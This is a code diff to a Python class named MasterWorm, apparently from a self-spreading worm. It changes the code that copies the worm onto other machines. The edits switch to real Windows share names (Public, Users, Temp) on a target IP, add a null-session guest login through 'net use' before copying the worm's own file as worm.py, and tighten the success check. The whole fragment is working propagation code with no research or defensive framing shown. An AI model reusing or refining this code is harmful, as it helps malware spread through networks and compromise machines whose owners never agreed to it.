@@ -225,17 +225,24 @@ class MasterWorm:
         try:
             worm_path = os.path.abspath(__file__)
             
-            # Try common user-accessible shares
+            # Try common user-accessible shares (using actual share names)
             accessible_shares = [
-                f'\\\\{target_ip}\\Users\\Public',
-                f'\\\\{target_ip}\\Users\\{os.environ.get("USERNAME")}\\Desktop',
-                f'\\\\{target_ip}\\Temp',
+                f'\\\\{target_ip}\\Public',  # Shared Public folder
+                f'\\\\{target_ip}\\Users',   # Shared Users folder
+                f'\\\\{target_ip}\\Temp',    # Shared Temp folder
             ]
             
             for share in accessible_shares:
                 try:
                     remote_path = f'{share}\\worm.py'
                     logger.info(f'[COPY] Trying {remote_path}')
+                    
+                    # Try to connect with null session (guest access)
+                    subprocess.run(
+                        ['net', 'use', share, '/user:'],
+                        capture_output=True,
+                        timeout=5
+                    )
                     
                     result = subprocess.run(
                         ['cmd', '/c', f'copy "{worm_path}" "{remote_path}"'],
@@ -244,9 +251,11 @@ class MasterWorm:
                         timeout=10
                     )
                     
-                    if result.returncode == 0 or 'copied' in result.stdout.lower():
+                    if result.returncode == 0 and 'copied' in result.stdout.lower():
                         logger.info(f'[COPY] ✓ Worm copied via {share}')
                         return True
+                    else:
+                        logger.debug(f'[COPY] Copy failed: {result.stderr}')
                         
                 except Exception as e:
                     logger.debug(f'[COPY] {share} failed: {e}')
@@ -271,7 +280,7 @@ class MasterWorm:
             )
             
             shares = [
-                f'\\\\{target_ip}\\Users\\Public',
+                f'\\\\{target_ip}\\Public',
                 f'\\\\{target_ip}\\Temp',
             ]
             
